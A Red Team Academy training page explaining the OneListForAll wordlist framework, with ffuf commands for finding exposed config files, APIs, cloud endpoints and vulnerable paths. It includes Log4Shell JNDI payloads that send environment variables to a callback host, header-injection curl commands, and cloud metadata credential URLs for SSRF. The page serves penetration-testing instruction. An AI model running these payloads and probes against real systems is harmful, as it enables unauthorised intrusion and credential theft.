---
layout: training-page
title: "OneListForAll — Advanced Wordlist Framework — Red Team Academy"
module: "Recon"
tags:
  - wordlists
  - onelistforall
  - olfa
  - fuzzing
  - web-recon
  - seclists
page_key: "recon-olfa-guide"
render_with_liquid: false
---

# OneListForAll — Advanced Wordlist Framework

## What Is OneListForAll?

**OneListForAll (OLFA)** is a meta-wordlist project that aggregates ~36 upstream wordlist sources (including SecLists, raft, tomnomnom, assetnote, and others), classifies every entry into one of 236 named categories, deduplicates, and produces both per-category lists and combined master lists. The result is the best single-list option for general web fuzzing and the most granular option for targeted attacks.

Repository: `github.com/six2dez/OneListForAll`  

  Standard install: `/opt/OneListForAll/` or wherever cloned locally.

```
# Clone and build (requires Go 1.22+ and ~15 GB free):
git clone https://github.com/six2dez/OneListForAll /opt/olfa
cd /opt/olfa
go run ./cmd/olfa pipeline   # full build — syncs sources, classifies, builds

# Or just use the pre-built files already in dict/:
ls /opt/olfa/dict/           # 418 category wordlists
ls /opt/olfa/Payloads/       # curated payload files
cat /opt/olfa/onelistforallmicro.txt  # 37,868 curated entries — start here
```

## The Three Tiers of OLFA Lists

| List | Lines | Contents | When to Use |
| --- | --- | --- | --- |
| onelistforallmicro.txt | 37,868 | Manually curated, highest signal-to-noise | Default starting list for any web target |
| onelistforallshort.txt | ~2,000,000 | micro + all *_short.txt per category | Thorough engagement, bug bounty |
| onelistforall_big.txt | >100M (not in repo) | Everything combined | Run locally after full pipeline build |
| dict/*_short.txt | varies | Per-category, high-priority sources only | Targeted attack against known tech/vuln |
| dict/*_long.txt | varies | Per-category, all sources | Comprehensive category-specific sweep |

```
# Recommended workflow — start micro, go deeper if needed:
# Round 1 (~5 min):
ffuf -u https://target.com/FUZZ \
  -w /opt/olfa/onelistforallmicro.txt \
  -mc 200,201,204,301,302,307,401,403 \
  -fs 0 -t 100 -ac -k

# Round 2 — tech-specific short lists (after fingerprinting stack):
ffuf -u https://target.com/FUZZ \
  -w /opt/olfa/dict/actuator_short.txt \  # if Spring Boot detected
  -mc 200,204,400 -k

# Round 3 — security categories (parallel):
ffuf -u https://target.com/FUZZ -w /opt/olfa/dict/env_short.txt -k &
ffuf -u https://target.com/FUZZ -w /opt/olfa/dict/swagger_short.txt -k &
ffuf -u https://target.com/FUZZ -w /opt/olfa/dict/git_config_short.txt -k &
wait
```

## Security-Focused Category Lists

These categories have no direct SecLists equivalent and are where OLFA adds unique value. Use them as targeted scans after initial recon.

### Exposed Secrets & Config Files

| Category | Short Lines | What It Finds |
| --- | --- | --- |
| env_short.txt | 1,090 | .env, .env.local, .env.production, .env.dev, framework-specific variants |
| git_config_short.txt | 49 | /.git/config, /.git/HEAD, nested .git paths across directories |
| dotfiles_short.txt | 1,379 | .htaccess, .htpasswd, .DS_Store, .npmrc, .dockercfg, editor config files |
| aws_short.txt | 137 | /.aws/credentials, /.s3cfg, buildspec files, AWS config paths |
| docker_short.txt | 12 | /.docker/config.json, /.dockercfg, Dockerrun files |
| secret_keywords_short.txt | 7 | Keyword list for parameter/response matching (apikey, password, token, etc.) |

```
# Discover .env files across a target:
ffuf -u https://target.com/FUZZ \
  -w /opt/olfa/dict/env_short.txt \
  -mc 200 -k -v

# Git config exposure:
ffuf -u https://target.com/FUZZ \
  -w /opt/olfa/dict/git_config_short.txt \
  -mc 200 -k
# If /.git/config returns 200: dump the repo with git-dumper
git-dumper https://target.com/.git /tmp/dumped_repo

# AWS credential exposure:
ffuf -u https://target.com/FUZZ \
  -w /opt/olfa/dict/aws_short.txt \
  -mc 200 -k -v
```

### API Surface Discovery

| Category | Short Lines | What It Finds |
| --- | --- | --- |
| swagger_short.txt | 4,168 | Swagger/OpenAPI spec paths at all common URL patterns |
| actuator_short.txt | 633 | Spring Boot Actuator endpoints (/actuator/*, /heapdump, /env, /beans) |
| juicy_short.txt | 70 | High-value paths: /admin, /api-docs, /actuator, /WEB-INF, /api/proxy |
| wellknown_short.txt | 30 | .well-known/* paths (ACME, OAuth discovery, security.txt, etc.) |
| debug_short.txt | 237 | Debug/diagnostic endpoints: /_ignition, /phpinfo, /app_dev.php, /_debugbar |
| logins_short.txt | 191 | Login panel paths across all common frameworks |

```
# Swagger discovery — often exposes full API schema:
ffuf -u https://target.com/FUZZ \
  -w /opt/olfa/dict/swagger_short.txt \
  -mc 200,400 -k -v
# Once found: curl the spec and run it through Postman or swagger-ui locally

# Spring Boot Actuator — /actuator/env exposes secrets, /heapdump contains creds:
ffuf -u https://target.com/FUZZ \
  -w /opt/olfa/dict/actuator_short.txt \
  -mc 200,204 -k
# High-value actuator hits:
# /actuator/env      — environment variables (DB passwords, API keys)
# /actuator/heapdump — JVM heap dump (strings contain secrets in memory)
# /actuator/mappings — full URL map of the application
# /actuator/loggers  — change log level to trigger log-based attacks
# /actuator/beans    — Spring bean definitions

# Quick juicy paths scan:
ffuf -u https://target.com/FUZZ \
  -w /opt/olfa/dict/juicy_short.txt \
  -mc 200,301,302,401,403 -k

# Debug endpoint detection:
ffuf -u https://target.com/FUZZ \
  -w /opt/olfa/dict/debug_short.txt \
  -mc 200 -k -v
```

### Vulnerability-Specific Categories

| Category | Short Lines | Attack Type |
| --- | --- | --- |
| ssrf_short.txt | 876 | Known SSRF-vulnerable paths with interactsh callback placeholders |
| open_redirect_short.txt | 106 | Open redirect parameter patterns (/////example.com, //google.com, etc.) |
| cors_short.txt | 29 | CORS misconfiguration headers and bypass patterns |
| crlf_short.txt | 15 | CRLF injection path patterns |
| log4j_short.txt | 4 | Log4Shell CVE-2021-44228 paths and payloads |
| deserialization_short.txt | 11 | Java deserialization endpoint paths (/deserialize, /json, /parse, /service/*) |
| traversal_short.txt | 8,300 | Path traversal / LFI with all encoding variants |
| xxe_short.txt | 157 | XXE payload variations |
| ssrf_long.txt | 10,631 | Comprehensive SSRF probe paths |

```
# SSRF — use ssrf_short.txt with Interactsh for OOB detection:
# Set up interactsh first: interactsh-client -server interactsh.com
INTERACT_URL="YOUR_INTERACTSH_URL"
ffuf -u "https://target.com/FUZZ" \
  -w /opt/olfa/dict/ssrf_short.txt \
  -mc 200,201,301,302,400 -k
# Replace {{interactsh-url}} placeholders in the list:
sed "s/{{interactsh-url}}/$INTERACT_URL/g" /opt/olfa/dict/ssrf_short.txt > /tmp/ssrf_ready.txt
ffuf -u "https://target.comFUZZ" \
  -w /tmp/ssrf_ready.txt -mc all -k

# Log4Shell detection (replace with your Interactsh URL):
cat /opt/olfa/dict/log4j_short.txt
# ${jndi:ldap://${env:user}.xyz.collab.com/a}  — tests env variable exfil
# /api/geojson?url=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.url.{{interactsh-url}}}

# Fuzz every header with Log4Shell payload:
PAYLOAD='${jndi:ldap://YOUR_INTERACTSH_URL/a}'
curl -s -H "User-Agent: $PAYLOAD" \
     -H "X-Forwarded-For: $PAYLOAD" \
     -H "X-Api-Version: $PAYLOAD" \
     -H "Referer: $PAYLOAD" \
     https://target.com/ -o /dev/null

# Nuclei Log4Shell templates:
nuclei -u https://target.com -t cves/2021/CVE-2021-44228.yaml

# Deserialization endpoint discovery:
ffuf -u "https://target.com/FUZZ" \
  -w /opt/olfa/dict/deserialization_short.txt \
  -mc 200,400,500 -k
# 500 errors on deserialization endpoints often indicate processing is happening
```

### Cloud & Container Infrastructure

| Category | Short Lines | What It Finds |
| --- | --- | --- |
| k8s_short.txt | 81 | Kubernetes API paths (/api/v1/*, /apis/apps/*, etcd keys) |
| aws_short.txt | 137 | AWS config leaks, S3 listing, EC2 metadata paths |
| azure_short.txt | 2,249 | Azure pipelines config, appsettings, Azure subdomain patterns |
| docker_short.txt | 12 | Docker API endpoints, .dockercfg, docker-cloud.yml |

```
# Kubernetes API exposure — unauthenticated kubelet or API server:
ffuf -u https://target.com/FUZZ \
  -w /opt/olfa/dict/k8s_short.txt \
  -mc 200,401,403 -k
# High-value hits:
# /api/v1/namespaces/default/secrets  → Kubernetes secrets
# /api/v1/namespaces/kube-system/secrets/kubernetes-dashboard-certs
# /apiserver-etcd-client.key          → etcd client cert (root access)

# Check for IMDS (Instance Metadata Service) if SSRF found:
# AWS:   http://169.254.169.254/latest/meta-data/
#        http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP:   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Azure: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# Docker API exposure (port 2375/2376):
curl http://target.com:2375/v1.41/containers/json   # list all containers
curl http://target.com:2375/v1.41/images/json       # list images
ffuf -u http://target.com:2375/FUZZ \
  -w /opt/olfa/dict/docker_short.txt -mc 200
```

### File Upload & Web Shell Detection

| Category | Short Lines | Use |
| --- | --- | --- |
| upload_variants_short.txt | 235 | File extension bypass variants for upload filtering ({EXT} placeholder) |
| backdoors_short.txt | 2,384 | Known web shell and backdoor paths to detect installed shells |
| shells_short.txt | 1,830 | Web shell path patterns |

```
# Upload extension bypass — {EXT} is a placeholder for your target extension:
# List contains variants like: ".php", ".php5", ".phtml", ".PhP", ".php.jpg", etc.
# Replace {EXT} with php for a PHP upload bypass list:
sed 's/{EXT}/php/g' /opt/olfa/dict/upload_variants_short.txt > /tmp/php_upload_bypass.txt
# Then test each variant as the uploaded filename

# Detect installed web shells on a compromised target:
ffuf -u https://target.com/FUZZ \
  -w /opt/olfa/dict/backdoors_short.txt \
  -mc 200 -k -v
```

## OLFA vs SecLists — When to Use Which

| Scenario | Recommended List | Source |
| --- | --- | --- |
| Fast first pass on any web target | onelistforallmicro.txt | OLFA |
| Standard directory bruteforce | raft-medium-words.txt | SecLists |
| Thorough bug bounty sweep | onelistforallshort.txt | OLFA |
| Subdomain enum — standard | subdomains-top1million-20000.txt | SecLists |
| Subdomain enum — thorough | subdomains_short.txt (430k) | OLFA |
| SQL injection payloads | Fuzzing/Databases/SQLi/quick-SQLi.txt | SecLists |
| SSTI payloads (comprehensive) | Payloads/ssti.txt | OLFA |
| SSRF known-vuln paths | ssrf_short.txt | OLFA |
| Spring Boot actuator | actuator_short.txt | OLFA |
| Swagger/OpenAPI discovery | swagger_short.txt | OLFA |
| Log4Shell | log4j_short.txt + Payloads/ | OLFA |
| Password spraying | Common-Credentials/top-passwords-shortlist.txt | SecLists |
| Default credentials | Passwords/Default-Credentials/*.txt | SecLists |
| Kubernetes API | k8s_short.txt | OLFA |
| AWS credential leaks | aws_short.txt | OLFA |
| Env file discovery | env_short.txt | OLFA |

## OLFA Payload Files

The `Payloads/` directory contains curated, consolidated payload lists that outperform the fragmented SecLists equivalents for several attack types.

| File | Lines | Coverage |
| --- | --- | --- |
| ssti.txt | 175 | All major engines: Jinja2, Twig, FreeMarker, Velocity, Mako, ERB, Smarty, Thymeleaf, Spring EL, Handlebars — detection + RCE |
| xss.txt | 27,436 | Comprehensive XSS — all contexts, all encodings |
| sqli.txt | 32,684 | All SQL injection types — error, blind, union, auth bypass |
| command_injection.txt | 529 | Shell metacharacters, URL-encoded variants, time-based blind, OS detection |
| crlf.txt | 275 | CRLF injection with response splitting, cookie injection, XSS chaining |
| lfi_linux.txt | 1,226 | Linux LFI paths — all encodings, wrappers, proc/ entries |
| lfi_win.txt | 258 | Windows LFI paths — win.ini, SAM, web.config, IIS logs |

```
# SSTI — comprehensive detection + RCE payloads:
ffuf -u "https://target.com/page?name=FUZZ" \
  -w /opt/olfa/Payloads/ssti.txt \
  -mr "1764|49|version|settings" -v
# The list includes both detection (42*42=1764) and RCE payloads for each engine

# LFI — Linux targets:
ffuf -u "https://target.com/page?file=FUZZ" \
  -w /opt/olfa/Payloads/lfi_linux.txt \
  -fs 0 -mc 200 -t 50

# LFI — Windows targets:
ffuf -u "https://target.com/page?file=FUZZ" \
  -w /opt/olfa/Payloads/lfi_win.txt \
  -fs 0 -mc 200 -t 50

# CRLF injection:
ffuf -u "https://target.com/redirectFUZZ" \
  -w /opt/olfa/Payloads/crlf.txt \
  -mc 200,301,302 -v
```

## The OLFA Category Taxonomy

OLFA classifies wordlist entries into 236 named categories defined in `configs/taxonomy.json`. This is the most granular classification system available in any public wordlist project. Key categories and their attack relevance:

```
# List all categories:
go run ./cmd/olfa list --categories

# Key offensive categories (select):
# --- Web Discovery ---
# directories, raft, fuzz_general, fuzz_mutations, paths, web_files
# admin, logins, backdoors, shells, debug, juicy

# --- API / Services ---
# api, swagger, actuator, graphql, wellknown, websocket, wsdl
# oauth, jwt, cors, ssrf

# --- Tech-Specific ---
# wordpress, drupal, joomla, sharepoint, confluence, magento, sitecore
# spring, django, rails, laravel, flask, nodejs, symfony, yii
# tomcat, jboss, weblogic, websphere, apache, nginx, iis
# jenkins, kibana, oracle, sap

# --- Cloud / Infra ---
# k8s, aws, azure, docker

# --- Injection / Vuln ---
# sqli, xss, ssti, lfi, traversal, xxe, ssrf, crlf, open_redirect
# command_injection, deserialization, log4j, rfi, xpath
# cors, secret_keywords

# --- Secrets ---
# env, git_config, dotfiles, aws, docker, npmrc
# config, default_credentials, upload_variants

# Build a custom combined list from multiple categories:
cat /opt/olfa/dict/env_short.txt \
    /opt/olfa/dict/git_config_short.txt \
    /opt/olfa/dict/aws_short.txt \
    /opt/olfa/dict/docker_short.txt \
    /opt/olfa/dict/swagger_short.txt \
    /opt/olfa/dict/actuator_short.txt \
  | sort -u > /tmp/custom_secrets.txt

ffuf -u https://target.com/FUZZ \
  -w /tmp/custom_secrets.txt \
  -mc 200,401,403 -k -v
```

## Recommended Engagement Workflows

```
# CTF / Time-boxed (30 min):
ffuf -u https://target.com/FUZZ \
  -w /opt/olfa/onelistforallmicro.txt \
  -x php,html,js,txt -mc 200,301,302,401,403 -t 100 -ac -k

# Standard Pentest (focused):
# Phase 1 — micro (quick wins):
ffuf -u https://target.com/FUZZ -w /opt/olfa/onelistforallmicro.txt -mc 200,301,302,401,403 -t 100 -k

# Phase 2 — security categories in parallel:
for list in env git_config aws docker swagger actuator juicy debug wellknown; do
  ffuf -u "https://target.com/FUZZ" \
    -w "/opt/olfa/dict/${list}_short.txt" \
    -mc 200,204 -k -o "/tmp/olfa_${list}.json" -of json 2>/dev/null &
done
wait
grep -h '"url"' /tmp/olfa_*.json | sort -u

# Bug Bounty (thorough):
# Start with micro, then onelistforallshort for full coverage:
feroxbuster -u https://target.com \
  -w /opt/olfa/onelistforallmicro.txt \
  -t 100 -k --auto-tune
# Follow with:
ffuf -u https://target.com/FUZZ \
  -w /opt/olfa/onelistforallshort.txt \
  -mc 200,301,302,401,403 -t 200 -k -ac
```
